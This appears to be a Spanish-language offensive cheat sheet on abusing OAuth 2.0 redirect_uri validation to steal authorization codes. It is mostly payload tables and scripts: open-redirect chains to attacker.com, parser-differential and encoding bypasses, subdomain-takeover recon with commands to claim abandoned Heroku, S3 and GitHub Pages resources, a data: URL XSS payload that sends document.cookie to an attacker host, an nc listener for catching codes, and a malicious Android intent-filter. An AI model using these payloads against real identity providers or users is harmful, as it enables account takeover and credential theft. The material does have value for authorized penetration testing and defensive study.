---
aliases:
  - OAuth redirect_uri Bypass
  - redirect_uri Injection
  - URL Parser Differential
  - OAuth Open Redirect Chain
tags:
  - type/technique
  - vuln/oauth
  - technique/credential-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[OAuth 2.0 Misconfigurations]]'
  - '[[Open Redirect]]'
  - '[[Subdomain Takeover]]'
---
# OAuth 2.0 - redirect_uri Manipulation

***

## Open Redirect Encadenado

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `https://idp/authorize?client_id=APP&response_type=code&redirect_uri=https://known.com/redirect?url=https://attacker.com&state=X&scope=email` | Code leak via OR interno de known.com | known.com tiene OR + es whitelisted. |
| `redirect_uri=https://known.com/login?next=https://attacker.com` | Leak via post-login next param | known.com con next/return param. |
| `redirect_uri=https://known.com/logout?return=https://attacker.com` | Leak post-logout | Logout flow con return. |
| `redirect_uri=https://known.com/404?back=https://attacker.com` | Error page back link OR | 404/error pages con back link. |
| `redirect_uri=https://known.com/track?dest=https://attacker.com` | Marketing redirect | Affiliate/ad tracking endpoints. |
| `redirect_uri=https://known.com/proxy?url=https://attacker.com` | CDN/proxy URL handler | Internal infra. |
| Capturar Referer en `attacker.com` post-redirect | `Referer: known.com/cb?code=XYZ` | OR sin preservar query → code en Referer. |
| `nc -lvnp 80` en attacker.com → recibir GET con `code` query | Code directo en URL | OR preserva query string. |
^oauth-redirect-openredirect

### Workflow Open Redirect chain

```http
GET /oauth/authorize?
  client_id=APP&
  response_type=code&
  redirect_uri=https://known.com/redirect?url=https://attacker.com/steal&
  state=ABC&
  scope=email

# IdP valida → known.com whitelisted → emite code
HTTP/1.1 302 Found
Location: https://known.com/redirect?url=https://attacker.com/steal&code=XYZ&state=ABC

# known.com redirige a attacker.com → atacante recibe code en Referer o query
GET /steal?code=XYZ&state=ABC HTTP/1.1
Host: attacker.com
```

___

## Path Traversal y Suffix Abuse

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `redirect_uri=https://known.com/cb/../../attacker.com` | Path traversal escape | Validation startswith / prefix match. |
| `redirect_uri=https://known.com.attacker.com/cb` | Suffix dominio atacante | Validation domain endswith laxa. |
| `redirect_uri=https://attacker.com/?x=https://known.com/cb` | Substring match bypass | Server contiene check substring. |
| `redirect_uri=https://known.com/cb/` y `redirect_uri=https://known.com/cb` | Trailing slash mismatch | Normalize bug. |
| `redirect_uri=https://KNOWN.com/cb` | Case sensitivity bypass | Validation case-sensitive. |
| `redirect_uri=https://kńown.com/cb` (IDN homograph, encoded como xn--knwn-...) | Visual confusion | Unicode IDN parsing. |
| `redirect_uri=https://known-com.attacker.com/cb` | Hyphen domain trick | Wildcard creative. |
| `redirect_uri=https://known.com:80@attacker.com/cb` | Userinfo trick — host real es attacker | URL parser permissivo. |
| `redirect_uri=https://known.com%2F..%2Fattacker.com/cb` | Encoded slashes path traversal | Decode-after-validate. |
| `redirect_uri=https://known.com%252F..%252Fattacker.com/cb` | Double encoding | Multi-pass decode. |
| `redirect_uri=https://known.com%00.attacker.com/cb` | Null byte truncation | Parser-truncate variant. |
^oauth-redirect-pathtraversal

___

## URL Parser Differential

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `redirect_uri=https://known.com@attacker.com/cb` | userinfo=known.com, host=attacker.com (host hijack) | Server parser ≠ browser parser. |
| `redirect_uri=https://attacker.com#@known.com/cb` | Server ve known.com como host, browser ve attacker.com | Fragment-based parser confusion. |
| `redirect_uri=https://known.com\.attacker.com/cb` | Backslash inconsistency parsers | Algunos validators ignoran `\`. |
| `redirect_uri=https://known.com%09.attacker.com/cb` | Tab char abuse | Control char en hostname. |
| `redirect_uri=https://known.com?@attacker.com/cb` | Query separator confusion | Parser dispute. |
| `redirect_uri=https:///attacker.com/cb` | Triple slash → empty host | Host="" edge. |
| `redirect_uri=https:/\/attacker.com/cb` | Slash/backslash mix | Algunos parsers normalizan. |
| `redirect_uri=//attacker.com/cb` | Protocol-relative URL | Schemeless. |
| `redirect_uri=https:// known.com/cb` (con espacio) | Whitespace en host | Parser tolerante. |
| Bash loop probando todos los tricks → ver code block | Bulk parser test | Identificar variant que funciona. |
^oauth-redirect-parser

### Parser test loop

```bash
for trick in \
  'https://known.com@attacker.com/cb' \
  'https://attacker.com#@known.com/cb' \
  'https://known.com\.attacker.com/cb' \
  'https://known.com:443@attacker.com/cb' \
  'https://known.com?@attacker.com/cb' \
  'https:///attacker.com/cb' \
  'https:/\/attacker.com/cb' \
  'https://known.com%09.attacker.com/cb'; do
  ENC=$(printf '%s' "$trick" | jq -sRr @uri)
  echo "=== $trick ==="
  curl -sI "https://target/oauth/authorize?client_id=APP&response_type=code&redirect_uri=$ENC&state=X" | grep -iE 'location|^HTTP'
done
```

___

## Subdomain Confusion / Takeover

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `subfinder -d known.com -silent \| httpx -silent -title -web-server -mc 200,403,404` | Lista subdomains alive de known.com | Pre-takeover recon. |
| `subjack -w subs.txt -t 100 -timeout 30 -ssl -c subjack-fingerprints.json -v 3` | Auto-detect dangling subdomains | Takeover candidates. |
| `nuclei -t http/takeovers/ -l subs.txt` | Templates específicos de takeover por servicio | Per-platform detection. |
| `dig CNAME abandoned.known.com` | CNAME del subdomain dangling | Identificar service. |
| `heroku apps:create attacker-victim` | Reclamar Heroku app abandonada | CNAME apunta a Heroku. |
| `aws s3 mb s3://victim-bucket` | Reclamar S3 bucket | CNAME apunta a S3. |
| Crear repo `username.github.io` con CNAME file = `victim.known.com` | GitHub Pages takeover | CNAME apunta a github.io. |
| Post-takeover: `redirect_uri=https://reclaimed.known.com/cb` | OAuth code interceptado | Wildcard `*.known.com` whitelisted. |
| `host -t A old.known.com` y verificar IP libre | DNS dangling A record | IP reclaim posible. |
^oauth-redirect-subdomain

### Subdomain takeover scan workflow

```bash
# Recon
subfinder -d known.com -silent | \
  httpx -silent -title -web-server -mc 200,403,404 -o alive.txt

# Filter takeover signals
grep -iE '(no such app|nosuchbucket|github\.io|domain not configured|fastly error)' alive.txt

# Validar con nuclei
nuclei -t http/takeovers/ -l alive.txt -o takeovers.txt

# Reclaim según provider:
# Heroku:    heroku apps:create attacker-victim
# S3:        aws s3 mb s3://victim-bucket
# GH Pages:  crear repo + CNAME file
# Azure:     New-AzWebApp -Name "attacker-victim"
```

___

## Scheme Abuse y Native App Hijack

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `redirect_uri=javascript:alert(document.cookie)` | XSS direct via JS scheme | IdP no valida scheme http/https. |
| `redirect_uri=data:text/html,<script>fetch('//attacker?'+document.cookie)</script>` | XSS via data URL | data: scheme aceptado. |
| `redirect_uri=data:text/html;base64,PHNjcmlwdD4uLi48L3NjcmlwdD4=` | Data URL base64 encoded | Filter naive sobre `<script>`. |
| `redirect_uri=file:///etc/passwd` | LFI via file scheme | Parser permissivo. |
| `redirect_uri=intent://callback#Intent;scheme=myapp;package=com.attacker;end` | Android intent hijack | App atacante con intent-filter. |
| `redirect_uri=myapp://callback` (registrar app atacante con mismo scheme) | Custom scheme hijack mobile | Intent picker mostraría ambas apps. |
| `redirect_uri=://attacker.com/cb` (empty scheme) | Empty scheme parser bypass | Parser tolerante. |
| `redirect_uri=http://127.0.0.1:8080/cb` (localhost loopback) | Confused deputy si app no enforce | Public clients allowed loopback. |
^oauth-redirect-scheme

### Scheme test commands

```bash
# JS scheme XSS probe
curl -sI "https://target/oauth/authorize?client_id=APP&response_type=code&state=X&redirect_uri=javascript:alert(1)" | grep -i location

# Data URL XSS payload
RU=$(printf 'data:text/html,<script>fetch(location.search).then(r=>fetch("https://attacker.com?"+r))</script>' | jq -sRr @uri)
curl -sI "https://target/oauth/authorize?client_id=APP&response_type=code&state=X&redirect_uri=$RU" | grep -i location

# Android intent-filter en app maliciosa AndroidManifest.xml:
cat <<EOF
<intent-filter>
  <action android:name="android.intent.action.VIEW"/>
  <category android:name="android.intent.category.DEFAULT"/>
  <category android:name="android.intent.category.BROWSABLE"/>
  <data android:scheme="myapp" android:host="callback"/>
</intent-filter>
EOF
```

***
